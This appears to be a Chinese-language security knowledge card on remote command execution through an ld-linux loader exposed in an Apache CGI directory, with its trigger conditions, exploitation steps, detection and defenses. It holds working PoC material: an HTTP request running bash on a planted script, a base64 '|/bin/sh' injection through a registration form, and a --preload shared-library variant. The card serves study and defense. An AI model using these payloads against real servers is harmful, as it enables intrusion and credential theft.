---
id: web-generic-cgi-ld-linux-interpreter-argv-arbitrary-program-execution
title: CGI 目录暴露 ld-linux：把动态加载器当 CGI 执行，argv 指定任意程序与脚本
type: scenario
domain: web
path: web/generic
technique: cgi-ld-linux-interpreter-argv-execution
aliases:
- ld-linux CGI
- 动态加载器 CGI
- ld.so 任意程序执行
- CGI 参数注入
- Apache CGI argv
- easy cgi
tags:
- web
- cgi
- apache
- ld-linux
- loader
- rce
- misconfiguration
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-06T10:19:29+08:00'
  notes: V166 指出的入库/CVE 归属问题已修复并重新 verify
---

## 一句话结论

把 `ld-linux-x86-64.so.2`（ELF 动态加载器）放进 Apache 的 CGI 目录并保留可执行权限时，访问 `/cgi-bin/ld-linux-x86-64.so.2` 会让 Apache 把 URL 的 path-info/query 作为命令行参数传给加载器；`ld.so` 的第一个非选项参数被当作要执行的 ELF，后续参数传给该程序，因此 `/cgi-bin/ld-linux-x86-64.so.2?/bin/bash+/tmp/script` 等价于执行 `/bin/bash /tmp/script`，直接命令执行。

## 原理

- **ld.so 的命令行语义**：`ld-linux.so [OPTION]... EXECUTABLE [ARGS...]`；它加载并运行 `EXECUTABLE`，把剩余参数作为该程序的 `argv`。还支持 `--library-path`、`--preload` 等选项，可进一步控制库搜索/预加载。
- **Apache CGI 的参数传递**：对 CGI 脚本，Apache 把 URL 的 query string（`?` 之后）作为命令行参数（按 `+` 解码为空格）传给 CGI 程序；path-info 也可能进入 `argv`。因此攻击者可以给 CGI 目录中的任意可执行文件“追加参数”。
- **把加载器当 CGI**：如果 `ld-linux-x86-64.so.2` 被放在 `cgi-bin/` 且可执行，Apache 会以 CGI 身份运行它。加载器把 query 中的 `/bin/bash` 当作 `EXECUTABLE`、`/tmp/messages.txt` 当作 bash 的脚本参数，从而执行攻击者写入的脚本。
- **脚本落地**：如果应用提供留言/注册等功能可写文件（如 `/tmp/messages.txt`），攻击者先把 base64 编码的第二阶段脚本写入该文件；再用上述 URL 让 bash 执行它，绕过“只能写不能执行”的限制。
- **为什么不是普通文件下载**：关键不是读取 ld-linux，而是 CGI 目录的可执行权限 + 参数注入；即使没有应用漏洞，暴露的加载器本身也能执行任意系统程序（`/bin/sh -c ...`）。

## 触发条件

- Apache（或其它 CGI 服务器）启用 `ExecCGI`，CGI 目录中存在 `ld-linux*.so*` 且可执行。
- 服务器把 query/path-info 作为 argv 传给 CGI；未对 CGI 参数做白名单/过滤。
- 攻击者能向服务器可读路径写入脚本（留言板、上传、日志注入等），或能直接利用 `/bin/sh -c` 参数执行。
- 目标文件系统有可用的 shell/解释器与攻击者需要的命令。

## 利用步骤

1. **探测 CGI 目录**：请求 `/cgi-bin/`、常见 CGI 路径，观察是否列出/可访问 `ld-linux-x86-64.so.2`；确认其可执行。
2. **准备第二阶段脚本**：通过应用功能（留言、注册、上传）把脚本写到 `/tmp/messages.txt` 等可读路径；脚本可 base64 解码后执行下一阶段。
3. **构造加载器 URL**：`/cgi-bin/ld-linux-x86-64.so.2?/bin/bash+/tmp/messages.txt`；`+` 在 query 中通常被解码为空格，形成 `argv = ["/bin/bash", "/tmp/messages.txt"]`。
4. **执行并回显**：访问该 URL；bash 读取脚本执行。若需要回显，脚本把结果写入应用可读取的文件（如留言板数据库/`/tmp` 下可下载文件）。
5. **横向/提权**：以 Web 用户权限执行命令，读取配置/凭据；若 CGI 以高权限运行，直接提权。

## PoC

```http
GET /cgi-bin/ld-linux-x86-64.so.2?/bin/bash+/tmp/messages.txt HTTP/1.1
Host: target
```

```bash
# /tmp/messages.txt 内容（由留言功能写入）
#!/bin/sh
id > /tmp/out.txt
cat /tmp/out.txt
```

```python
# 先把 exp2.py base64 后写入留言，再触发加载器
username = "echo <base64>|base64 -d|/bin/sh"
requests.post(target + "/cgi-bin/register.cgi", data={"username": username, "password": "aaaaa"})
requests.get(target + "/cgi-bin/ld-linux-x86-64.so.2?/bin/bash+/tmp/messages.txt")
```

不同服务器对 `?`/`+`/path-info 的解析不同；若 query 不能直接作为 argv，可尝试 path-info（`/cgi-bin/ld-linux.so.2/../../bin/bash`）或 `--argv0` 等加载器选项。本卡不执行 PoC。

## 变体与关联

- **其它解释器/加载器**：`libc.so.6`（可执行时）、`ld-musl`、`python`、`perl`、`busybox` 等放在 CGI 目录同样可被参数注入执行。
- **`--preload` 变体**：`ld.so --preload /tmp/evil.so /bin/true` 可加载攻击者共享库；需要能写 `.so`。
- **Shellshock 类**：CGI 环境变量注入（如 `User-Agent` 中的函数定义）是另一条路径；本卡是加载器参数注入。
- **关联**：[[web-php-rce-htaccess-cgi-addhandler-bypass-disable-functions]]（CGI 执行配置滥用）、[[binary-pwn-setuid-got-plt-lazy-binding-hijack]]（加载器/动态链接相关）、[[web/generic/file-upload]] 类写入落地点。
- **边界**：CGI 目录未启用 ExecCGI、加载器无执行权限、服务器过滤 `?`/参数、或使用 `suexec` 限制时不可用。

## 检测与防御

- **部署**：不要把 `ld-linux*.so*`、`libc.so*`、解释器二进制放进 Web 可执行目录；CGI 目录只放必要的、经过审计的脚本。
- **服务器配置**：关闭不必要的 `ExecCGI`；使用 `Options -ExecCGI`；对 CGI 参数做白名单；启用 `suexec` 以低权限运行。
- **文件权限**：Web 目录去除加载器/库的执行位；上传/留言文件不可执行；`/tmp` 使用 noexec（可缓解但非根治）。
- **检测**：访问日志中出现 `/cgi-bin/ld-linux*`、`?/bin/`、`--preload`、异常 CGI 参数；CGI 进程执行 shell/读取敏感文件；监控 Web 目录中新增的加载器/解释器。
- **响应**：移除暴露文件、审计是否已被利用、轮换 Web 凭据、检查 `/tmp` 下脚本。
